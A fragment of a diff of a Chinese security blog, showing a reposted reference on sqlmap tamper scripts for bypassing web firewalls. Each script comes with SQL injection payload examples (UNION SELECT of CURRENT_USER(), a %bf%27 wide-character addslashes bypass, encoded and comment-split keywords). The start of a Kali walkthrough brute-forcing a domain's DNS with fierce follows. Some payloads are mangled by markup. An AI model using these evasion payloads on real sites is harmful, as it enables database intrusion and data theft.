5.1</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-076735</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：between.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用between替换大于号（&gt;）</p><br><div style="color: #555555;"><br><div id="highlighter_828717" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND A &gt; B–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND A NOT BETWEEN 0 AND B–’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5 <em> Oracle 10g </em> PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-068815</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mysqldash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p><br><p style="color: #555555;">注：之前有个mssql的 这个是mysql的</p><br><div style="color: #555555;"><br><div id="highlighter_795519" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1–%0AAND–%0A9227=9227’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br><li>MSSQL</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：multiplespaces.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：围绕SQL关键字添加多个空格</p><br><div style="color: #555555;"><br><div id="highlighter_398915" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT foobar’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT foobar’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-072489</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2plus.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用+替换空格</p><br><div style="color: #555555;"><br><div id="highlighter_575586" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT+id+FROM+users’</code> <code class="sql plain">Tested against: </code><code class="sql color1" style="color: gray !important;">all</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：bluecoat.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p><br><div style="color: #555555;"><br><div id="highlighter_759136" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users where id = 1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT%09id FROM users where id LIKE 1’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.1, SGOS</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：nonrecursivereplacement.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p><br><div style="color: #555555;"><br><div id="highlighter_177692" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT 2–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 UNIOUNIONN SELESELECTCT 2–’</code> <code class="sql plain">Tested against: </code><code class="sql color1" style="color: gray !important;">all</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2randomblank.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p><br><div style="color: #555555;"><br><div id="highlighter_934294" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT%0Did%0DFROM%0Ausers’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：sp_password.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p><br><div style="color: #555555;"><br><div id="highlighter_124416" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227– ‘</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227– sp_password’</code> <code class="sql plain">Requirement: <em> MSSQL </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：chardoubleencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用: 双url编码(不处理以编码的)</p><br><div style="color: #555555;"><br><div id="highlighter_277513" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">%20TABLE </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：unionalltounion.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换UNION ALL SELECT UNION SELECT</p><br><p style="color: #555555;">Example: (‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’</p><br><p style="color: #555555;">Requirement: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：charencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：url编码</p><br><div style="color: #555555;"><br><div id="highlighter_568327" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">&nbsp;&nbsp; Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">%20TABLE</code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em>&nbsp;&nbsp; </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：randomcase.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：随机大小写 Example:</p><br><ul style="color: #555555;"><br><li>Input: INSERT</li><br><li>Output: InsERt</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：unmagicquotes.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：宽字符绕过 GPC addslashes</p><br><div style="color: #555555;"><br><div id="highlighter_770532" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: 1′ </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">1=1 </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%bf%27 </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">1=1–%20</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：randomcomments.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用/**/分割sql关键字</p><br><div style="color: #555555;"><br><div id="highlighter_687317" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">‘</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">INSERT</code><code class="sql plain">’ becomes ‘</code><code class="sql color1" style="color: gray !important;">IN</code><code class="sql plain">//S//ERT’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：charunicodeencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：字符串 unicode 编码</p><br><div style="color: #555555;"><br><div id="highlighter_535588" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">FIELD%20FROM </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">TABLE</code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>ASP</li><br><li>ASP.NET</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2000</li><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 5.1.56</li><br><li>PostgreSQL 9.0.3</li><br></ul><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-074261</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：securesphere.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：追加特制的字符串</p><br><div style="color: #555555;"><br><div id="highlighter_759524" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 1=1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">“1 AND 1=1 and ‘0having’=’0having’”</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：versionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：注释绕过</p><br><div style="color: #555555;"><br><div id="highlighter_319716" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: 1 </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code> <code class="sql color1" style="color: gray !important;">ALL</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, CONCAT(</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,122,114,115,58),IFNULL(</code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain">() </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(32)),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,115,114,121,58))# </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1/!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code><code class="sql plain"><strong>!</strong></code><code class="sql color1" style="color: gray !important;">ALL</code><code class="sql plain">!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain"><strong>!</strong></code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"><em>/,/</em>!</code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"><em>/,/</em>!CONCAT<em>/(/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(58,122,114,115,58),/</em>!IFNULL<em>/(</em></code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(/!</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain"><em>/()/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code><code class="sql plain">!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/),/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(32)),/</em>!</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain"><em>/(58,115,114,121,58))# </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &gt;= 5.1.13</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2comment.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：Replaces space character (‘ ‘) with comments ‘/**/’</p><br><div style="color: #555555;"><br><div id="highlighter_438696" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">id </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code> <code class="sql plain">users </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"><em> </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain">//id//</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code><code class="sql plain">/**/users</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-046496</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：halfversionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：关键字前加注释</p><br><div style="color: #555555;"><br><div id="highlighter_672000" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"> Input: value’ </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">UNION</code> <code class="sql color1" style="color: gray !important;">ALL</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">CONCAT(</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,107,112,113,58),IFNULL(</code><code class="sql color2" style="color: #ff1493 !important;">CAST</code><code class="sql plain">(</code><code class="sql color2" style="color: #ff1493 !important;">CURRENT_USER</code><code class="sql plain">() </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">AS</code> <code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(32)),</code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">CHAR</code><code class="sql plain">(58,97,110,121,58)), </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain">, </code><code class="sql color1" style="color: gray !important;">NULL</code><code class="sql plain"># </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">‘QDWa’=</code><code class="sql string" style="color: blue !important;">‘QDWa </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql string" style="color: blue !important;"><em> Output: value’/</em>!0UNION/<em>!0ALL/</em>!0SELECT/<em>!0CONCAT(/</em>!0CHAR(58,107,112,113,58),/<em>!0IFNULL(CAST(/</em>!0CURRENT_USER()/<em>!0AS/</em>!0CHAR),/<em>!0CHAR(32)),/</em>!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=’</code><code class="sql plain">QDWa</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &lt; 5.1</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4.0.18, 5.0.22</li><br></ul>
-      
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/" data-id="cisyte7dg000bzds5djfy3jay" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/转载-Hack/"> - 转载 - Hack</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-kalixi-lie-xin-xi-shou-ji-jie-duan-yi" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/" class="article-date">
-  	<time datetime="2016-08-01T15:20:17.000Z" itemprop="datePublished">2016-08-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/">Kali系列——信息收集阶段（二）</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a> 
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/">Kali系列——信息收集阶段（二）</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/">
+            <time datetime="2016-08-01T15:20:17.000Z" itemprop="datePublished">2016-08-01</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创-Hack/"> - 原创 - Hack</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <a id="more"></a> 
 <p>##fierece<br>暴力破解dns解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># fierce -dns dbstye.net</span></div><div class="line"></div><div class="line">Trying zone transfer first...</div><div class="line"></div><div class="line">Unsuccessful <span class="keyword">in</span> zone transfer (it was worth a shot)</div><div class="line">Okay, trying the good old fashioned way... brute force</div><div class="line"></div><div class="line">Checking <span class="keyword">for</span> wildcard DNS...</div><div class="line">Nope. Good.</div><div class="line">Now performing 2280 <span class="built_in">test</span>(s)...</div></pre></td></tr></table></figure></p>
 <p>应用字典</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>
@@ -829,62 +1399,131 @@
